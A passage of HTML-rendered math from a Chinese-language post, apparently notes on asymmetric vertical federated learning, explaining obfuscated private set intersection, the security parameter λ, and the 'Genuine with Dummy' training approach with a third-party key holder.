style="height:0.2663em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8882em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mtight">†</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.2333em;vertical-align:-0.2663em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.967em;"><span style="top:-2.4337em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.1809em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">†</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2663em;"><span></span></span></span></span></span></span></span></span></span> ，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="normal">U</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi><mo>†</mo></mrow></msup></mrow><annotation encoding="application/x-tex">\mathrm{U}^{obf\dagger}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathrm">U</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mtight">†</span></span></span></span></span></span></span></span></span></span></span></span>对应的明文除了包含真正的交集外还包含 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="normal">I</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathrm{I}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathrm">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 中的部分数据，但 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi mathvariant="script">I</mi><mn>1</mn><mi>o</mi></msubsup><mo>∩</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo>=</mo><msubsup><mi mathvariant="script">I</mi><mn>2</mn><mi>o</mi></msubsup><mo>∩</mo><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1^o\cap \mathcal{I}_2^o =\mathcal{I}_{2}^{o} \cap \mathcal{I}^{obf}=\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">o</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9314em;vertical-align:-0.2481em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-2.4519em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2481em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 的是后续求交运算准确性的基础。</p><p>注意：<code>安全数（secure number）</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span></span></span></span>被解释为<strong>模糊交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span></span></span></span></strong> 与<strong>真实交集 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">I</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="script">I</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}_1=\mathcal{I}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong> 的基数比 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><mi>λ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">λ</span><span class="mclose">)</span></span></span></span> ，详细作用可看算法1。</p><p>也就是说从模糊交集中随机选择一元素，其恰好位于真实交集的概率为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>h</mi><mo stretchy="false">(</mo><mi>λ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1/h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">λ</span><span class="mclose">)</span></span></span></span> 。进一步地，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h(0)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord">0</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 表示的是模糊交集与真实交集完全相同，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1,\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 拥有的全都是真实交集，即这种特殊情况下AVFL变成了SVFL。而 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\lambda=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 时对应的，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mo>=</mo><msup><mi mathvariant="script">I</mi><mn>1</mn></msup></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}=\mathcal{I}^1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span>，此时 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 无法从算法1中获取任何信息。<br><strong>随着 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>λ</mi></mrow><annotation encoding="application/x-tex">\lambda</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">λ</span></span></span></span> 从0递增到1，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mi>h</mi><mo stretchy="false">(</mo><mi>λ</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1/h(\lambda)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">h</span><span class="mopen">(</span><span class="mord mathnormal">λ</span><span class="mclose">)</span></span></span></span> 指数递减，因此 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 更难从模糊交集中分辨出真实交集，更安全</strong>。</p><h1 id="Asymmetrical-Federated-Model-Training">Asymmetrical Federated Model Training</h1><h2 id="Genuine-with-Dummy-Approcah">Genuine with Dummy Approcah</h2><p>如图3所示，纵向联邦学习学习域中现在包含有<strong>空白（margin）</strong>，也就是说在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="script">I</mi><mrow><mi>o</mi><mi>b</mi><mi>f</mi></mrow></msup><mi mathvariant="normal">/</mi><mtext> </mtext><msub><mi mathvariant="script">I</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{I}^{obf}/\  \mathcal{I}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">b</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span></span></span></span></span></span></span></span></span><span class="mord">/</span><span class="mspace"> </span><span class="mord"><span class="mord mathcal" style="margin-right:0.07382em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0738em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 对应的样本缺少全部的标签和部分特征。虽然联邦迁移学习中可以通过<code>特征表示迁移（ feature-representation-transfer）</code>方法填充这些空白，但是在现实很多应用中，比如金融风险管控中<strong>更倾向于选择少量但准确的原始数据</strong>。</p><p>因此，有必要设计能<strong>够使用APSI协议产生的分布式结构作为输入，但是产生与SVFL相同结果的非对称模型训练协议</strong>。本文展示了一种<code>带虚拟的真实（Genuine with Dummy，GWD）</code>方法以实现非对称模型训练。注意此处需要引入<strong>可行第三方 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></strong>；</p><ol><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 产生1个公钥密码系统，将公钥分发给 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 和  <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 交换中间变量以协作地计算梯度和损失。 弱方 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 将会在真实交集中的数据样本上正常执行运算规则，而在虚拟样本执行<strong>数学恒等式运算</strong>，以便它们的存在不会影响相关计算结果</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0822em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="script">P</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathcal{P}_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathcal" style="margin-right:0.08222em;">P</span><span class="msupsub"><span class="vlist-t 